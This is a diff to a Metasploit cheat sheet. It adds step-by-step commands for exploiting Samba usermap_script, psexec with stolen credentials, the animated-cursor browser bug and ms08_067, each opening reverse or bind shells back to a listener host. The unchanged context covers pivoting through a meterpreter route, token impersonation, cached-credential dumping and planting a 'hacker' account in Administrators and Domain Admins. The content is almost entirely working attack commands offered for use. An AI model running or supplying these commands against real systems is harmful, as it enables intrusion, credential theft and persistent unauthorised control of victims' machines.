@@ -1,6 +1,91 @@
 Metasploit
 
 
+# msfcli
+
+root@kali:~# msfcli -h
+
+When using msfcli, variables are assigned using '=' and all options are case-sensitive. 
+root@kali:~# msfcli exploit/multi/samba/usermap_script RHOST=10.0.0.20 PAYLOAD=cmd/unix/reverse LHOST=10.0.0.5 E
+
+If you aren't entirely sure about what options belong to a particular module, you can append the letter 'O' to the end of the string. 
+root@kali:~# msfcli exploit/multi/samba/usermap_script O
+
+To display the payloads that are available for the current module, append the letter 'P' to the end of the string.
+root@kali:~# msfcli exploit/multi/samba/usermap_script P
+------------------------------------------------------------------------------------------------------
+
+# msfconsole
+
+root@kali:~# msfconsole
+
+Entering 'help' or a '?' once in the msf command prompt will display available commands and their descriptions.
+------------------------------------------------------------------------------------------------------
+
+# Using Exploits
+
+use <exploit>
+show targets
+show payloads
+show options
+show advanced
+show evasion
+------------------------------------------------------------------------------------------------------
+
+# Active Exploits
+
+Force an active module to the background.
+exploit -j
+
+This example makes use of a previously acquired set of credentials to exploit and gain a reverse shell on the target system. 
+use exploit/windows/smb/psexec
+set RHOST 10.0.0.20
+set PAYLOAD windows/shell/reverse_tcp
+set LHOST 10.0.0.5
+set LPORT 4444
+set SMBUSER victim
+set SMBPASS s3cr3t
+exploit
+------------------------------------------------------------------------------------------------------
+
+# Passive Exploits
+
+Show active sessions.
+sessions -l
+
+Interact with session 2.
+sessions -i 2
+
+Example setup to exploit the animated cursor vulnerability. The exploit does not fire until a victim browses to our malicious website. 
+use exploit/windows/browser/ani_loadimage_chunksize
+set URIPATH /
+set PAYLOAD windows/shell/reverse_tcp
+set LHOST 10.0.0.5
+set LPORT 4444
+exploit
+------------------------------------------------------------------------------------------------------
+
+# Generating Payloads
+
+(more to come)
+------------------------------------------------------------------------------------------------------
+
+# Database
+
+Start the database before starting msfconsole.
+root@kali:~# service postgresql start
+root@kali:~# msfconsole
+
+List database backend commands.
+msf > help database
+
+Verify you are connected to the database.
+msf > hosts
+
+List all hosts running ssh.
+msf > services -p 22
+------------------------------------------------------------------------------------------------------
+
 # Apache Tomcat Manager Common Administrative Credentials
 
 use multi/tomcat_mgr_deploy
@@ -79,24 +164,25 @@ meterpreter > ipconfig
 192.168.0.10
 255.255.255.0
  
-10.10.10.5
+10.0.0.5
 255.255.255.0
  
 meterpreter > run arp_scanner -r 10.10.10.1/24
-10.10.10.1
-10.10.10.2
-10.10.10.5
- 
+10.0.0.1
+10.0.0.2
+10.0.0.5
+10.0.0.20
+
 meterpreter > background
-route add 10.10.10.1 255.255.255.0 x	                   # Where x is the meterpreter session number.
+route add 10.0.0.1 255.255.255.0 x	                   # Where x is the meterpreter session number.
 route print
 use auxiliary/scanner/portscan/tcp
-set RHOSTS 10.10.10.2
+set RHOSTS 10.0.0.20
 set PORTS 1-200
 set THREADS 255
 exploit
 use exploit/windows/smb/ms08_067_netapi
-set RHOST 10.10.10.2
+set RHOST 10.0.0.20
 set PAYLOAD windows/meterpreter/bind_tcp
 exploit
 ------------------------------------------------------------------------------------------------------
@@ -112,7 +198,6 @@ exploit
 ------------------------------------------------------------------------------------------------------
 
 ===  Below here are OLD notes that have NOT been organized.  ===
-
 
 meterpreter > impersonate_token DOMAIN\Administrator
 [+] Delegation token available
@@ -422,7 +507,7 @@ run post/windows/gather/cachedump
 use incognito
 list_tokens -u
  
-add_user hacker password -h <target-IP>
+add_user hacker password -h <target IP>
 add_localgroup_user Administrators hacker -h <target IP>
  
 add_group_user "Domain Admins" hacker -h <target IP>
